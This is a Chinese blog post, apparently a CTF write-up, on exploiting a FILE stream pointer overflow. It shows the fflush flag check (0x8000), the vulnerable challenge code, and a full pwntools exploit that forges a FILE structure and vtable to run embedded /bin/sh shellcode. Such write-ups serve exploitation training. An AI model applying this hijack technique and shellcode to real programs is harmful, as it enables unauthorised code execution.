---
title: Attention about FSPO
date: 2017-06-12 00:12:54
tags:
- FILE stream pointer overflow
categories:
- misc_exploit
---

我一直以为单纯的伪造fake FILE结构体就行，然后把vtable设置为shellcode的地址或者类似的gadget的地址。但是今天做的那个FSPO那个题按照这思路还是有点问题的。不知道为啥我明明调试调到了fflush内部我居然没仔细看出错的原因....不稳~
需要注意的是文件操作函数内部的条件判断。
例如：fflush函数内部开始有如下判断：
<!-- more -->
```c
int __fastcall fflush(__int64 a1)
{
  __int64 v1; // rdx@2
  __int64 v3; // r9@3
  bool v5; // zf@4
  __int64 v6; // rbx@11
  __int64 v7; // rdx@11
  __int64 v9; // rsi@13
  bool v10; // zf@14

  if ( a1 )
  {
    v1 = a1;
    if ( *(_DWORD *)a1 & 0x8000 )
    {
LABEL_11:
      v6 = v1;
    ......
}
```
所以当伪造fake FILE结构体时开始的四字节要设置为0x8000。

题目如下：
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf; // [sp+0h] [bp-D0h]@1
  FILE *stream; // [sp+C8h] [bp-8h]@1

  setbuf(stdin, 0LL);
  setbuf(_bss_start, 0LL);
  setbuf(stderr, 0LL);
  printf("enter the secret:", 0LL);
  read(0, &store, 0x3E8uLL);
  stream = fopen("./test", "wb");
  printf("enter your name:", "wb");
  read(0, &buf, 0xD0uLL);
  fflush(stream);
  fclose(stream);
  return 0;
}
```

题目比较简单，伪造一个假的FILE结构体就行。
```python
from pwn import *

debug = 1
if debug:
  p = process('./pwn1')
else:
  p = remote('10.50.1.3', 8888)

store_addr = 0x6010A0
fake_file = p32(0x8000) + '\x00' * 0xd4 #FILE
fake_file += p64(store_addr + 0xd8 + 8) # vtable
fake_file += p64(0x6012c0) * 40
sc = "\xeb\x10\x48\x31\xc0\x5f\x48\x31\xf6\x48\x31\xd2\x48\x83\xc0\x3b\x0f\x05\xe8\xeb\xff\xff\xff\x2f\x62\x69\x6e\x2f\x2f\x73\x68"
fake_file += sc

p.recvuntil("enter the secret:")
p.send(fake_file)
#gdb.attach(p)
p.recvuntil("enter your name:")
payload = 'a' * 0xc8 + p64(store_addr)
p.sendline(payload)

p.interactive()
```
